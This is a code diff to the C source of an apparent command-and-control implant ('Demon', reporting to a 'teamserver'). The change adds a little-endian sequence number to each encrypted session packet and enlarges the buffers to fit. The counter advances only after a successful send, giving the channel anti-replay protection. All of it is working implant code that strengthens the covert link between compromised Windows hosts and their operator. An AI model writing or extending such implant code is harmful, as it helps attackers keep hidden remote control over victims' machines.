@@ -428,16 +428,26 @@ BOOL PackageTransmitAll(
         BOOL     ecdh_ok    = FALSE;
 
         /* Mark all queued packages as included and compute DemonMessage payload size.
-         * DemonMessage wire format per package: cmd_id(4 LE) | req_id(4 LE) | len(4 LE) | data */
+         * GCM plaintext wire format: seq_num(8 LE) | per-pkg: cmd_id(4 LE) | req_id(4 LE) | len(4 LE) | data
+         * seq_num provides monotonic anti-replay protection; the teamserver rejects any
+         * packet whose seq_num is not strictly greater than the last accepted value. */
         for ( Cur = Instance->Packages; Cur; Cur = Cur->Next ) {
             Cur->Included = TRUE;
             msg_len += 4 + 4 + 4 + (SIZE_T)Cur->Length;
         }
 
-        /* Allocate +1 so LocalAlloc(LPTR,0) isn't called for an empty queue */
-        msg_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, msg_len + 1 );
+        /* Allocate: 8-byte seq_num prefix + DemonMessage body + 1 guard byte */
+        msg_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, 8 + msg_len + 1 );
         if ( msg_buf ) {
+            UINT64 seq = Instance->ECDH.SeqNum + 1; /* next seq_num (starts at 1) */
             PUINT8 cursor = msg_buf;
+
+            /* Write seq_num as 8-byte little-endian prefix */
+            cursor[0] = (UINT8)(seq      ); cursor[1] = (UINT8)(seq >>  8);
+            cursor[2] = (UINT8)(seq >> 16); cursor[3] = (UINT8)(seq >> 24);
+            cursor[4] = (UINT8)(seq >> 32); cursor[5] = (UINT8)(seq >> 40);
+            cursor[6] = (UINT8)(seq >> 48); cursor[7] = (UINT8)(seq >> 56);
+            cursor += 8;
 
             for ( Cur = Instance->Packages; Cur; Cur = Cur->Next ) {
                 UINT32 cmd = Cur->CommandID;
@@ -457,15 +467,19 @@ BOOL PackageTransmitAll(
             }
 
             /* Seal as ECDH session packet: conn_id(16) | nonce(12) | ciphertext | tag(16) */
-            pkt_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, 16 + 12 + msg_len + 16 );
+            SIZE_T total_msg = 8 + msg_len;
+            pkt_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, 16 + 12 + total_msg + 16 );
             if ( pkt_buf && ecdh_build_session_packet(
                     Instance->ECDH.ConnectionId,
                     Instance->ECDH.SessionKey,
-                    (const ei_u8 *)msg_buf, (ei_size_t)msg_len,
+                    (const ei_u8 *)msg_buf, (ei_size_t)total_msg,
                     (ei_u8 *)pkt_buf, &pkt_written,
                     ArchonEcdhRng ) ) {
 
                 if ( TransportSend( pkt_buf, (SIZE_T)pkt_written, &raw_resp, &raw_rsize ) ) {
+                    /* Only advance SeqNum after a confirmed successful send */
+                    Instance->ECDH.SeqNum = seq;
+
                     if ( raw_resp && raw_rsize >= (SIZE_T)ECDH_SESS_RESP_MIN ) {
                         /* Response: nonce(12) | ciphertext | tag(16); allocate upper-bound */
                         PUINT8 plain_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, raw_rsize );
